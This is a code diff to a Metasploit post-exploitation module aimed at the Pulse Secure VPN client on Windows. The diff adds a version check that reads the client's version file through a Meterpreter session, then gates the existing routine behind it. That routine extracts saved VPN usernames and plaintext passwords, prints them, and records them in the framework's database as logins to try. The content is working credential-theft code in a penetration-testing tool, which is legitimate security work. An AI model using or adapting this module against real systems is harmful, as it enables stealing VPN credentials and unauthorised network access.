@@ -69,6 +69,17 @@ class MetasploitModule < Msf::Post
     return process.memory.read(addr, len)
   end
 
+  def get_version
+    begin
+      version_path = "C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini"
+      version_data = session.fs.file.open(version_path).read.to_s
+      matches = version_data.scan(/DisplayVersion=([0-9\.]*)/m)
+      return Gem::Version.new(matches[0][0])
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
+    end
+  end
+
   def get_ives
     # parse connection profiles from Pulse Secure connection store and returns them
     # in a dict, indexed by connection identifier.
@@ -135,48 +146,54 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    creds = get_creds
-    if creds.any?
-      creds.each do |cred|
-        print_good("Account Found:")
-        print_status("     Username: #{cred['username']}")
-        print_status("     Password: #{cred['password']}")
-        print_status("     URI: #{cred['uri']}")
-        print_status("     Name: #{cred['friendly-name']}")
-        print_status("     Source: #{cred['connection-source']}")
-
-        uri = URI(cred['uri'])
-        service_data = {
-          address: Rex::Socket.getaddress(uri.host),
-          port: uri.port,
-          protocol: "tcp",
-          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-          realm_value: uri.path,
-          service_name: "Pulse Secure SSL VPN",
-          workspace_id: myworkspace_id
-        }
-
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: self.refname,
-          username: nil,
-          private_data: cred['password'],
-          private_type: :password
-        }
-
-        credential_core = create_credential(credential_data.merge(service_data))
-
-        login_data = {
-          core: credential_core,
-          access_level: "User",
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }
-
-        create_credential_login(login_data.merge(service_data))
-      end
+    version = get_version
+    if version >= Gem::Version.new('9.1.4')
+      print_status("Target is running Pulse Secure Connect version #{version}. Not affected.")
     else
-      print_error "No users with configs found. Exiting"
+      print_status("Target is running Pulse Secure Connect version #{version}. Affected.")
+      creds = get_creds
+      if creds.any?
+        creds.each do |cred|
+          print_good("Account Found:")
+          print_status("     Username: #{cred['username']}")
+          print_status("     Password: #{cred['password']}")
+          print_status("     URI: #{cred['uri']}")
+          print_status("     Name: #{cred['friendly-name']}")
+          print_status("     Source: #{cred['connection-source']}")
+
+          uri = URI(cred['uri'])
+          service_data = {
+            address: Rex::Socket.getaddress(uri.host),
+            port: uri.port,
+            protocol: "tcp",
+            realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+            realm_value: uri.path,
+            service_name: "Pulse Secure SSL VPN",
+            workspace_id: myworkspace_id
+          }
+
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            username: nil,
+            private_data: cred['password'],
+            private_type: :password
+          }
+
+          credential_core = create_credential(credential_data.merge(service_data))
+
+          login_data = {
+            core: credential_core,
+            access_level: "User",
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }
+
+          create_credential_login(login_data.merge(service_data))
+        end
+      else
+        print_error "No users with configs found. Exiting"
+      end
     end
   end
 end
